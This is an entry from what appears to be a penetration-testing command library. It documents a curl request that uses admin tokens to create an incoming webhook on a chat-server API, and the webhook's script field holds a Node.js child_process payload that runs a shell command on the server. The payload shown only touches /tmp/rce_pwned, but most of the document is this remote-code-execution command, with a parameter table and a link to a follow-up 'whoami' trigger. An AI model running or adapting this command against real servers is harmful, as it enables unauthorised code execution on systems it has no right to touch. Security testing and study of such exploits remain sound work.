---
id: cmd-curl-create-webhook
data: >-
  curl -X POST 'http://target:3000/api/v1/integrations.create' -H 'X-Auth-Token:
  admin_token' -H 'X-User-Id: admin_id' -H 'Content-Type: application/json' -d
  '{"type":"Incoming","name":"RCE
  Webhook","channel":"#general","script":"require(\"child_process\").exec(\"touch
  /tmp/rce_pwned\")"}'
tags:
  - api
  - rce
type: command
output: Webhook created with ID
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:19.869Z'
verified: false
validated: true
submitted: true
---
# curl-create-webhook

## Command

```bash
curl -X POST 'http://target:3000/api/v1/integrations.create' -H 'X-Auth-Token: admin_token' -H 'X-User-Id: admin_id' -H 'Content-Type: application/json' -d '{"type":"Incoming","name":"RCE Webhook","channel":"#general","script":"require(\"child_process\").exec(\"touch /tmp/rce_pwned\")"}'
```

## Description

Creates the malicious webhook using admin auth headers.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| X-Auth-Token | Admin token | Yes |
| script | Node.js payload | Yes |

## Examples

### Basic Usage

```bash
curl -X POST ... (as above)
```

## Expected Output

{"integration": {id: "...", enabled: true}}

## Related

- [[commands/curl-trigger-webhook-whoami]]
